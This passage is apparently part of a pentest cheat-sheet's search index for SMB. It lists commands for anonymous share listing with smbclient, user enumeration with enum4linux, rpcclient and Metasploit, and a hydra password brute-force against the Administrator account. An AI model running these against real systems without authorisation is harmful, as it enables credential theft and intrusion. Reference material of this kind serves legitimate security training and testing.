'C$\\backdoor\n</code></pre> <p>With smbclient : </p> <pre><code>smbclient -L //192.42.109.3/ -U \"\"\n\nsmbclient //192.42.109.3/public -U \"\"\n</code></pre>"},{"location":"windows/smb/#enumerate-users","title":"\ud83d\udd0d Enumerate users","text":"<p>You can enumerate active users on the targets : </p> <pre><code># -a to enum all options\nenum4linux -a &lt;IP&gt;\n\n# With rpcclient : Connect then use enumdomusers\nrpcclient -U \"\" -N &lt;IP&gt; \n\n# Metasploit Module :\nuse auxiliary/scanner/smb/smb_enumusers\n</code></pre>"},{"location":"windows/smb/#bruteforce","title":"\ud83d\udee0\ufe0f  Bruteforce","text":"<p>This can be done with hydra : </p> <pre><code>hydra -l Administrator -P /opt/rockyou.txt smb://&lt;IP&gt; -v -V\n</code></pre>"}]}